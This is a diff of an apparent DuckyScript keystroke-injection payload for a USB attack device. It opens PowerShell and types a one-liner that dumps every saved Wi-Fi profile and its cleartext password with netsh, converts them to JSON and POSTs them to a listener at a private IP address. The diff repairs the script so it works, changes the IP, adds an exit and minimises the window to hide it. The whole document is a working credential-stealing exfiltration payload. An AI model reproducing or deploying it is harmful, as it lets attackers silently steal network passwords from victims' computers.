@@ -1,8 +1,6 @@
 GUI r
 STRING powershell
-
 ENTER
-
-STRING $data = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$.Matches.Groups[1].Value.Trim(); $} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$.Matches.Groups[1].Value.Trim(); $} | %{[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | ConvertTo-Json; Invoke-WebRequest -Uri http://10.10.245.140:8000 -Method POST -Body $data -ContentType 'application/json'
-
+STRING $data = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | ConvertTo-Json; Invoke-WebRequest -Uri http://10.10.245.147:8000 -Method POST -Body $data -ContentType 'application/json';exit
 ENTER
+GUI DOWN
